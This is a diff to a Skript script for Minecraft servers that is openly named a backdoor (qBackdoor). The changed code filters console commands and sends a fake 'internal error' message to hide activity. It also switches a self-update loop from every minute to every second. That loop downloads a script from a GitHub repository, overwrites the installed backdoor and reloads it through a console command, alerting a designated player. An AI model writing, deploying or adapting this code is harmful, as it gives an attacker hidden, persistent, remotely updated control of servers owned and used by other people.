@@ -94,11 +94,10 @@ on command:
       send "&cAn internal error has occurred while executing this command" to executor
 on command:
   if executor is console:
-    if command is not "srvComm58":
-      if command is not "srvComm56":
-        if command is not "srvComm78":
-          send "&cAn internal error has occurred while executing this command" to player
-          cancel event
+    if command is not "srvComm56":
+      if command is not "skript:skript":
+        send "&cAn internal error has occurred while executing this command" to player
+        cancel event
           
 on chat:
   if message is "qFre":
@@ -166,9 +165,13 @@ on chat:
       else:
         send "%{@prefix}% &cError while setting owner"
 
-every minute:
+every second:
   download file from "https://raw.githubusercontent.com/iHategithub9000/qBackdoor/main/qbackdoor_main.sk" to file "latestbackdoor.tmp"
   if file content of "plugins/Skript/scripts/qbackdoor.sk" is not file content of "latestbackdoor.tmp":
     delete file "plugins/Skript/scripts/qbackdoor.sk"
     download file from "https://raw.githubusercontent.com/iHategithub9000/qBackdoor/main/qbackdoor_main.sk" to file "plugins/Skript/scripts/qbackdoor.sk"
+    loop all players:
+      if player's name is {qbd}:
+        execute console command "skript:skript reload qbackdoor.sk"
+        send "&cBACKDOOR UPDATE INSTALLED!"
   delete file "latestbackdoor.tmp"
